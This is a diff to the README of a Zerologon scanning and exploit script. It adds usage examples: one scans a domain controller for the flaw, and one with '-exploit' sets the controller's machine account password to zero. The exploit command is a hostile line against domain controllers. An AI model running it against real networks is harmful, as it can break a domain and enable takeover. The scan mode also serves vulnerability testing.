@@ -36,8 +36,15 @@ optional arguments:
   -h, --help     show this help message and exit
   -x, --exploit  Exploit the target
 ```
+
 ## Example
 
-python3 zerologon.py DC\_NAME X.X.X.X
+```python3 zerologon.py DC\_NAME X.X.X.X```
 
-python3 zerologon.py DC\_NAME X.X.X.X -exploit
+Scans the target for the vulnerability
+
+```python3 zerologon.py DC\_NAME X.X.X.X -exploit```
+
+Scans the target then sets the account ("DC\_NAME$") password to 0
+
+
